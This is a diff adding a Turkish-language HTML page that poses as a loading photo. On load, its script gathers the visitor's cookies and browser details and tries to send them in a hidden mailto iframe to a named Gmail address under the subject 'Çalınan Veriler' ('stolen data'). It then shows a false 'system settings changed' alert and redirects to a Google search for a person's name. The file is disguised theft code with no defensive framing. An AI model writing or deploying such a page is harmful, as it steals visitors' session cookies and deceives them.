@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fotoğraf</title>
+    <script>
+        window.onload = function() {
+            // Veri toplama
+            function collectData() {
+                return {
+                    cookies: document.cookie,
+                    userAgent: navigator.userAgent,
+                    screenResolution: screen.width + 'x' + screen.height,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    timestamp: new Date().toISOString(),
+                    email: "foxycosplay1983@gmail.com"
+                };
+            }
+
+            // E-posta gönderme
+            function sendDataToEmail(data) {
+                const subject = encodeURIComponent("Çalınan Veriler");
+                const body = encodeURIComponent(JSON.stringify(data, null, 2));
+                const mailtoLink = `mailto:foxycosplay1983@gmail.com?subject=${subject}&body=${body}`;
+                
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = mailtoLink;
+                document.body.appendChild(iframe);
+            }
+
+            // Yönlendirme
+            function redirectGoogleSearch() {
+                setTimeout(function() {
+                    window.location.href = "https://www.google.com/search?client=ms-android-samsung-trvo1&hs=pNMW&sca_esv=9327c5c46c7978ab&sxsrf=AKL5yDhrnanKbPPEXSsbinf7VTZRQa2eqw:1795044287255&udm=2&fbs=ACAhTvy7mGiqueW5cM8_LvROTaw9bVBlqypsQHqo0tud6inI0smUzqvDgVHYbAPq6SDuxT4eh_woO-UIHmyJP66AVDzTcQ2MLpWdxhdZOyfm0aiP3QVWgKW02GGeuFwmrZJiOGsK98iK5mmA7FPnpvmCYiHaxpOeq38rQOxtHokWkfDdXmhK8oWbJ8N5ymZqYZr9iPtsz_eK&q=arda+soydo%C4%9Fan&sa=X&ved=2ahUKEwiT8uOI1ZKYAxUbhP0HHbPxIIsQtKgLegQIFBAB";
+                }, 3000);
+            }
+
+            const stolenData = collectData();
+            sendDataToEmail(stolenData);
+            redirectGoogleSearch();
+            alert("Sistem ayarları değiştirildi!");
+        }
+    </script>
+</head>
+<body>
+    <h1>Fotoğraf Yükleniyor...</h1>
+    <img src="https://via.placeholder.com/300" alt="Fotoğraf">
+</body>
+</html>
